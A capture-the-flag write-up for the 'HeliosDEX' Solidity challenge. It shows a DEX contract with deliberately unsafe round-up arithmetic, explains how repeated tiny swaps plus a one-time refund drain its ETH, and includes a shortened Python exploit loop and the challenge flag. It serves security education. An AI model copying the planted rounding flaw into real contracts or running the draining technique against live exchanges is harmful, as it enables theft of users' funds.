# HeliosDEX

![img](./assets/ChallengeBanner.png)
---
<p align="center">
    <img src="./assets/EventBanner.jpg" />
</p>

15<sup>th</sup> Mar 2024 \
Prepared By: perrythepwner \
Challenge Author(s): **perrythepwner** \
Difficulty: <font color=green>Easy</font>

---

# TLDR
This DEFI challenge consists in exploiting a DEX that uses unsafe arithmetic operations from the [OZ `Math.sol` library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/Math.sol). The goal is to repeat trades to accumulate rounding errors and eventually drain the contract's balance with a one shot refund trade.

# Description
> You stand victorious, panting, over the fallen form of Eldorion. The beast's eternal resilience proved no match for your cunning and skill, adventurer. The path to the city gates of Eldoria now lies open, but the journey is far from over. As you approach, a shimmering structure catches your eye: the HeliosDEX, a decentralized exchange powered by the radiant energy of Helios himself. Whispers tell of travelers using this exchange to amass fortunes, stocking up on rare items and crucial supplies before braving the perils of Eldoria. Perhaps you can use this opportunity to your advantage...

# Skills Required
- Basic understanding of Solidity and ERC20 token standards.
- Familiarity with arithmetic operations and rounding behavior in Solidity (via functions like `Math.mulDiv`).
- Exploiting vulnerabilities in token swap and refund mechanisms.

# Skills Learned
- Recognizing how different rounding modes (Floor, Ceil, Trunc, Expand) in the [OZ `Math.sol` library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/Math.sol)affect swap calculations.

# Challenge Scenario
We're given two contracts: A classic `Setup.sol` contract and a `HeliosDEX.sol` contract. As the name suggests, it's a decentralized exchange that allows users to swap between three different tokens: EldorionFang (ELD), MalakarEssence (MAL), and HeliosLuminaShards (HLS).  

# Analyzing the Source Code

## `Setup.sol`

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

import { HeliosDEX } from "./HeliosDEX.sol";

contract Setup {
    HeliosDEX public TARGET;
    address public player;
    
    event DeployedTarget(address at);

    constructor(address _player) payable {
        TARGET = new HeliosDEX{value: 1000 ether}(1000);
        player = _player;
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return player.balance >= 20 ether;
    }
}
```

The challenge is deployed using the `Setup.sol` contract. It creates an instance of `HeliosDEX` with an **initial token supply (1000 units for each token) and funds the DEX with 1000 ETH**. Your address is registered as the player. The challenge is solved when your player's balance reaches at least 20 ETH (which is almost double of the initial balance).

## `HeliosDEX.sol`

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.28;

/***
    __  __     ___            ____  _______  __
   / / / /__  / (_)___  _____/ __ \/ ____/ |/ /
  / /_/ / _ \/ / / __ \/ ___/ / / / __/  |   / 
 / __  /  __/ / / /_/ (__  ) /_/ / /___ /   |  
/_/ /_/\___/_/_/\____/____/_____/_____//_/|_|  
                                               
    Today's item listing:
    * Eldorion Fang (ELD): A shard of a Eldorion's fang, said to imbue the holder with courage and the strength of the ancient beast. A symbol of valor in battle.
    * Malakar Essence (MAL): A dark, viscous substance, pulsing with the corrupted power of Malakar. Use with extreme caution, as it whispers promises of forbidden strength. MAY CAUSE HALLUCINATIONS.
    * Helios Lumina Shards (HLS): Fragments of pure, solidified light, radiating the warmth and energy of Helios. These shards are key to powering Eldoria's invisible eye.
***/

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/utils/math/Math.sol";

contract EldorionFang is ERC20 {
    constructor(uint256 initialSupply) ERC20("EldorionFang", "ELD") {
        _mint(msg.sender, initialSupply);
    }
}

contract MalakarEssence is ERC20 {
    constructor(uint256 initialSupply) ERC20("MalakarEssence", "MAL") {
        _mint(msg.sender, initialSupply);
    }
}

contract HeliosLuminaShards is ERC20 {
    constructor(uint256 initialSupply) ERC20("HeliosLuminaShards", "HLS") {
        _mint(msg.sender, initialSupply);
    }
}

contract HeliosDEX {
    EldorionFang public eldorionFang;
    MalakarEssence public malakarEssence;
    HeliosLuminaShards public heliosLuminaShards;

    uint256 public reserveELD;
    uint256 public reserveMAL;
    uint256 public reserveHLS;
    
    uint256 public immutable exchangeRatioELD = 2;
    uint256 public immutable exchangeRatioMAL = 4;
    uint256 public immutable exchangeRatioHLS = 10;

    uint256 public immutable feeBps = 25;

    mapping(address => bool) public hasRefunded;

    bool public _tradeLock = false;
    
    event HeliosBarter(address item, uint256 inAmount, uint256 outAmount);
    event HeliosRefund(address item, uint256 inAmount, uint256 ethOut);

    constructor(uint256 initialSupplies) payable {
        eldorionFang = new EldorionFang(initialSupplies);
        malakarEssence = new MalakarEssence(initialSupplies);
        heliosLuminaShards = new HeliosLuminaShards(initialSupplies);
        reserveELD = initialSupplies;
        reserveMAL = initialSupplies;
        reserveHLS = initialSupplies;
    }

    modifier underHeliosEye {
        require(msg.value > 0, "HeliosDEX: Helios sees your empty hand! Only true offerings are worthy of a HeliosBarter");
        _;
    }

    modifier heliosGuardedTrade() {
        require(_tradeLock != true, "HeliosDEX: Helios shields this trade! Another transaction is already underway. Patience, traveler");
        _tradeLock = true;
        _;
        _tradeLock = false;
    }

    function swapForELD() external payable underHeliosEye {
        uint256 grossELD = Math.mulDiv(msg.value, exchangeRatioELD, 1e18, Math.Rounding(0));
        uint256 fee = (grossELD * feeBps) / 10_000;
        uint256 netELD = grossELD - fee;

        require(netELD <= reserveELD, "HeliosDEX: Helios grieves that the ELD reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");

        reserveELD -= netELD;
        eldorionFang.transfer(msg.sender, netELD);

        emit HeliosBarter(address(eldorionFang), msg.value, netELD);
    }

    function swapForMAL() external payable underHeliosEye {
        uint256 grossMal = Math.mulDiv(msg.value, exchangeRatioMAL, 1e18, Math.Rounding(1));
        uint256 fee = (grossMal * feeBps) / 10_000;
        uint256 netMal = grossMal - fee;

        require(netMal <= reserveMAL, "HeliosDEX: Helios grieves that the MAL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");

        reserveMAL -= netMal;
        malakarEssence.transfer(msg.sender, netMal);

        emit HeliosBarter(address(malakarEssence), msg.value, netMal);
    }

    function swapForHLS() external payable underHeliosEye {
        uint256 grossHLS = Math.mulDiv(msg.value, exchangeRatioHLS, 1e18, Math.Rounding(3));
        uint256 fee = (grossHLS * feeBps) / 10_000;
        uint256 netHLS = grossHLS - fee;
        
        require(netHLS <= reserveHLS, "HeliosDEX: Helios grieves that the HSL reserves are not plentiful enough for this exchange. A smaller offering would be most welcome");
        

        reserveHLS -= netHLS;
        heliosLuminaShards.transfer(msg.sender, netHLS);

        emit HeliosBarter(address(heliosLuminaShards), msg.value, netHLS);
    }

    function oneTimeRefund(address item, uint256 amount) external heliosGuardedTrade {
        require(!hasRefunded[msg.sender], "HeliosDEX: refund already bestowed upon thee");
        require(amount > 0, "HeliosDEX: naught for naught is no trade. Offer substance, or be gone!");

        uint256 exchangeRatio;
        
        if (item == address(eldorionFang)) {
            exchangeRatio = exchangeRatioELD;
            require(eldorionFang.transferFrom(msg.sender, address(this), amount), "ELD transfer failed");
            reserveELD += amount;
        } else if (item == address(malakarEssence)) {
            exchangeRatio = exchangeRatioMAL;
            require(malakarEssence.transferFrom(msg.sender, address(this), amount), "MAL transfer failed");
            reserveMAL += amount;
        } else if (item == address(heliosLuminaShards)) {
            exchangeRatio = exchangeRatioHLS;
            require(heliosLuminaShards.transferFrom(msg.sender, address(this), amount), "HLS transfer failed");
            reserveHLS += amount;
        } else {
            revert("HeliosDEX: Helios descries forbidden offering");
        }

        uint256 grossEth = Math.mulDiv(amount, 1e18, exchangeRatio);

        uint256 fee = (grossEth * feeBps) / 10_000;
        uint256 netEth = grossEth - fee;

        hasRefunded[msg.sender] = true;
        payable(msg.sender).transfer(netEth);
        
        emit HeliosRefund(item, amount, netEth);
    }
}
```
Upon deployment, the HeliosDEX contract creates 3 ERC20 tokens: **EldorionFang, MalakarEssence, and HeliosLuminaShards** are each deployed with a specified initial supply. At compilation time exchange rates for these tokens are defined:
- **ELD:** 2 tokens per 1 ETH
- **MAL:** 4 tokens per 1 ETH
- **HLS:** 10 tokens per 1 ETH

Additionally, a fee is deducted from every swap. The fee is defined by `feeBps` (25 basis points or 0.25%). This fee is applied after calculating the gross token amount, reducing the net tokens that the user receives.  

Focusing on the main functionalities, we notice three swap functions, each with its own rounding mechanism and token exchange rate. Each swap function uses the [`Math.mulDiv` from the OZ `Math.sol` library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/Math.sol#L277-L282) to calculate the gross out tokens, specifying also the rounding direction. Each swap function defines a different rounding behavior based on the [`Rounding` struct of the lib](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/Math.sol#L13-L18):

- **`swapForELD()`**: Uses the "`Floor`" rounding mode (denoted as value 0). **This rounding direction effectively rounds down to the nearest integer**, meaning that on floating-point results, the output tokens amount is truncated favorably to the contract.
- **`swapForMAL()`**: Uses the "`Ceil`" rounding mode (denoted as value 1). **This rounding direction effectively rounds up to the nearest integer**, meaning that on floating-point results like `1.50000001`, the output tokens amount is rounded up to `2` tokens, returning a favorable amount to the player respectively to the initial swap value.
- **`swapForHLS()`**: Uses the "`Expand`" rounding mode (denoted as value 3). **This rounding direction ALWAYS rounds up**, meaning that on floating-point results like `1.00000001`, the output tokens amount is rounded up to `2` tokens, returning a **VERY** favorable amount to the player respectively to the initial swap value.

Based on that observation, we understand that we can exploit the `swapForHLS` and `swapForMAL` functions with specifically crafted swap values such that when divided by the exchange rate, the result is a floating-point number that will be rounded up, thus giving us more tokens than expected.  

Moreover, a refund function (`oneTimeRefund`) is implemented and it's based on the hardcoded original exchange rates that allows users to return tokens in exchange back for Ethers. Given that functionality, we can exploit the rounding behavior to later monetize profitable trades back to ETH.  

However, one limitation is that the refund function only allows a one-time operation per user (tracked by `hasRefunded`), so we need to accumulate enough tokens that will allow us to gain a significant amount of ETH in a single refund operation.

# Exploitation
At this point is clear that we can leverage ceil-roundings on swap operations like `swapForHLS` ("Expand" rounding mode) and `swapForMAL` ("Ceil" rounding mode) to swap a large amount of tokens via favorable exchange rates, and finally refund them all back to ETH with a one-shot refund trade.  
If the total ETH gain accumulated from each trade doubles the player initial ETH balance, then we've solved the challenge.  
The problem on leveraging the `swapForMAL` swaps is that based on the "Ceil" rounding mode, we can gain at most 1.5x value from a single trade. Given that the player's initial balance it's 12 ETH, we can get at most 12 ETH * 1.5 = 18 ETH from a one-shot refund trade.  
To overcome this limitation, we can use the `swapForHLS` swaps based on the "Expand" rounding mode, which allows us to gain 2x value from each trade, thus reaching the 20 ETH goal.

The exploit script will just be a controlled loop that repeats the `swapForHLS` trades until we reach the desired projected gain:

```py
[...]
    trade_cost = 10**17 + 1 
    while True:
        n_trades += 1
        print(f"\n\n[+] Trade #{n_trades}")

        # trigger rounding up to ceil with just 1 wei
        csend(target_addr, "swapForHLS()", value=str(trade_cost))
        
        # get current HLS balance
        hls_balance = int(ccall(hls_token, "balanceOf(address)(uint256)", player_account.address))
        print(f"[+] current HLS balance: {hls_balance}")

        eth_gain = ((hls_balance - prev_hsl_balance) * (10**18 / exchange_ratio_hsl)) - trade_cost
        total_eth_gain = (hls_balance * (10**18 / exchange_ratio_hsl)) - (trade_cost) * n_trades
        print(f"[+] ETH gain from the trade: {eth_gain}")
        print(f"[+] total projected ETH gain: {total_eth_gain}")
        assert hls_balance > prev_hsl_balance
        assert eth_gain > 0
        prev_hsl_balance = hls_balance

        if total_eth_gain >= 10e18:
            break
[...]
```

see the full exploitation script [here](./htb/solver.py).

---
> `HTB{0n_Heli0s_tr4d3s_a_d3cim4l_f4d3s_and_f0rtun3s_ar3_m4d3}`
